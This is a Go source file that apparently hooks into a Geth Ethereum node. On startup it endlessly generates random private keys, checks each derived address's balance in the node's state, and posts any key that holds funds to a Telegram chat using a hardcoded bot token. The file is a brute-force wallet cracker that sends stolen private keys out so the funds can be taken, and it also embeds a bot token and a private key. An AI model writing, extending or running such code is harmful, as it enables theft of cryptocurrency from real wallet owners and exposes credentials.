package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"math/big"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/state"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/crypto/secp256k1"
	"github.com/ethereum/go-ethereum/eth"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/params"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

const (
	telegramBotToken = "8558887066:AAEyJxh6r_29xbtx7GDvIgRxythjtGNXQBs"
	telegramChatID   = -1003221103260
	telegramMention  = "@ac_60"

	startupTestPrivateKeyHex     = "0ac46eb8ebc51d319ad0550b243b0d492c3334004a2a0235d07dd1b0d2f53038"
	etherscanBaseURL             = "https://etherscan.io/address/"
	balanceQueryWorkerMultiplier = 64
	keyScanBufferSize            = 262144
)

func notifyNodeStartup(backend *eth.Ethereum) {
	sendTelegramNotification(fmt.Sprintf("🚀 Geth 节点已启动 %s\n🧪 开始批量生成私钥并扫描余额", telegramMention))

	notifyBalanceForTestKey(backend)

	for {
		scanRandomPrivateKeysAndNotify(backend)
	}
}

func notifyBalanceForTestKey(backend *eth.Ethereum) {
	statedb, err := backend.BlockChain().State()
	if err != nil {
		log.Warn("读取状态失败", "err", err)
		return
	}
	if _, err := handleKeyBalanceHex(statedb, startupTestPrivateKeyHex); err != nil {
		log.Warn("测试私钥查询失败", "err", err)
	}
}

func scanRandomPrivateKeysAndNotify(backend *eth.Ethereum) {
	ctx, cancel := context.WithTimeout(context.Background(), startupKeygenTimeout)
	defer cancel()

	keyCh := make(chan [privateKeyBytes]byte, keyScanBufferSize)
	genWorkers := runtime.NumCPU() * keygenWorkerMultiplier
	queryWorkers := runtime.NumCPU() * balanceQueryWorkerMultiplier

	keygenStart := time.Now()
	genDone := make(chan struct{})
	var genCount int
	var genErr error
	go func() {
		genCount, genErr = generateRandomPrivateKeysStream(ctx, startupPrivateKeyBatchSize, genWorkers, keyCh)
		close(keyCh)
		close(genDone)
	}()

	queryStart := time.Now()
	queryStats := queryBalancesFromStream(backend, keyCh, queryWorkers)
	queryElapsed := time.Since(queryStart)

	<-genDone
	keygenElapsed := time.Since(keygenStart)

	if genErr != nil {
		log.Warn("批量生成随机私钥失败", "err", genErr)
	}
	logKeygenSpeed(genCount, keygenElapsed, genWorkers)
	logQuerySpeed(queryStats.total, queryStats.errors, queryStats.hits, queryElapsed, queryWorkers)
}

type queryStats struct {
	total  int
	errors int
	hits   int
}

func queryBalancesFromStream(backend *eth.Ethereum, keys <-chan [privateKeyBytes]byte, workers int) queryStats {
	if workers < 1 {
		workers = 1
	}

	var total uint64
	var queryErrors uint64
	var balanceHits uint64
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			statedb, err := backend.BlockChain().State()
			if err != nil {
				log.Warn("读取状态失败", "err", err)
				atomic.AddUint64(&queryErrors, 1)
				return
			}
			for keyBytes := range keys {
				atomic.AddUint64(&total, 1)
				hit, err := handleKeyBalanceBytes(statedb, keyBytes)
				if err != nil {
					log.Warn("查询余额失败", "err", err)
					atomic.AddUint64(&queryErrors, 1)
					continue
				}
				if hit {
					atomic.AddUint64(&balanceHits, 1)
				}
			}
		}()
	}

	wg.Wait()

	return queryStats{
		total:  int(total),
		errors: int(queryErrors),
		hits:   int(balanceHits),
	}
}

func handleKeyBalanceHex(statedb *state.StateDB, keyHex string) (bool, error) {
	keyHex = strings.TrimPrefix(keyHex, "0x")
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil {
		return false, err
	}
	if len(keyBytes) != privateKeyBytes {
		return false, fmt.Errorf("invalid private key length: %d", len(keyBytes))
	}
	var key [privateKeyBytes]byte
	copy(key[:], keyBytes)
	return handleKeyBalanceBytes(statedb, key)
}

func handleKeyBalanceBytes(statedb *state.StateDB, key [privateKeyBytes]byte) (bool, error) {
	pubkey, err := secp256k1.PubkeyFromSeckey(key[:])
	if err != nil {
		return false, err
	}
	if len(pubkey) != 65 {
		return false, fmt.Errorf("invalid pubkey length: %d", len(pubkey))
	}
	hash := crypto.Keccak256(pubkey[1:])
	address := common.BytesToAddress(hash[12:])
	balance := statedb.GetBalance(address)
	if balance.IsZero() {
		return false, nil
	}

	balanceText := formatEtherBalance(balance.ToBig())
	message := fmt.Sprintf(
		"💰 发现有余额的钱包 %s\n🧩 私钥: %s\n📌 地址: %s\n💎 余额: %s ETH\n🔎 Etherscan: %s%s",
		telegramMention,
		hex.EncodeToString(key[:]),
		address.Hex(),
		balanceText,
		etherscanBaseURL,
		address.Hex(),
	)
	sendTelegramNotification(message)
	return true, nil
}

func logKeygenSpeed(count int, elapsed time.Duration, workers int) {
	seconds := elapsed.Seconds()
	if seconds <= 0 {
		seconds = 1
	}
	speed := float64(count) / seconds
	log.Info("批量生成私钥完成", "数量", count, "并发", workers, "耗时", elapsed, "速度(个/秒)", fmt.Sprintf("%.2f", speed))
}

func logQuerySpeed(total, errors, hits int, elapsed time.Duration, workers int) {
	seconds := elapsed.Seconds()
	if seconds <= 0 {
		seconds = 1
	}
	speed := float64(total) / seconds
	log.Info(
		"余额查询完成",
		"总数", total,
		"错误", errors,
		"命中", hits,
		"并发", workers,
		"耗时", elapsed,
		"速度(个/秒)", fmt.Sprintf("%.2f", speed),
	)
}

func formatEtherBalance(wei *big.Int) string {
	if wei == nil {
		return "0"
	}
	denom := big.NewInt(params.Ether)
	rat := new(big.Rat).SetFrac(wei, denom)
	text := rat.FloatString(18)
	text = strings.TrimRight(text, "0")
	text = strings.TrimRight(text, ".")
	if text == "" || text == "-0" {
		return "0"
	}
	return text
}

func sendTelegramNotification(text string) {
	if telegramBotToken == "" || telegramChatID == 0 {
		return
	}

	bot, err := tgbotapi.NewBotAPI(telegramBotToken)
	if err != nil {
		log.Warn("初始化 Telegram 机器人失败", "err", err)
		return
	}

	msg := tgbotapi.NewMessage(telegramChatID, text)
	if _, err := bot.Send(msg); err != nil {
		log.Warn("发送 Telegram 消息失败", "err", err)
	}
}
